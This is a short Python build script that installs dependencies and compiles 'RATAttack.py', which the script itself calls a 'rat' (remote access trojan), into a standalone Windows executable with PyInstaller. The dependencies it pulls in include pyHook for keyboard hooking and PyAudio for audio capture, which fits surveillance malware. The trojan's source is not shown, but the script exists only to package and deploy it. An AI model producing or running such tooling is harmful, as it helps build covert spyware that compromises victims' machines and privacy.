from platform import machine
from os import system as s
from os.path import exists
import sys

auto = len(sys.argv) == 2 and sys.argv[1] == '--yes'

if not auto:
    input("\nNow going to install dependencies and compile the rat, make sure you have prepped RATAttack.py beforehand\n\n\nPress ENTER to resume")

s('pip install -r requirements.txt')

if machine().lower() == '':
    print('\nUnable to determine platform.\n')
    exit(1)
elif machine().lower() == 'i386':
    fileA = 'https://download.lfd.uci.edu/pythonlibs/h2ufg7oq/PyAudio-0.2.11-cp37-cp37m-win32.whl'
    fileB = 'https://download.lfd.uci.edu/pythonlibs/h2ufg7oq/pyHook-1.5.1-cp37-cp37m-win32.whl'
elif machine().lower() == 'amd64':
    fileA = 'https://download.lfd.uci.edu/pythonlibs/h2ufg7oq/PyAudio-0.2.11-cp37-cp37m-win_amd64.whl'
    fileB = 'https://download.lfd.uci.edu/pythonlibs/h2ufg7oq/pyHook-1.5.1-cp37-cp37m-win_amd64.whl'
else:
    print('\n\nYou are probably running a processor like ARM: "' + machine().lower() + '". This isn\'t supported due to the lack of dependencies supporting ARM.')

s('pip install '+fileA)
s('pip install '+fileB)

if not auto:
    input('\n\nDid the install run correctly?\n\n\nPress ENTER to build')

# s('compile.bat')
s('pip install pyinstaller')

s('pyinstaller --clean --onefile "RATAttack.py"')

if exists('dist/RATAttack.exe'):
    print('\n\nScript has finished')
else:
    exit(1)
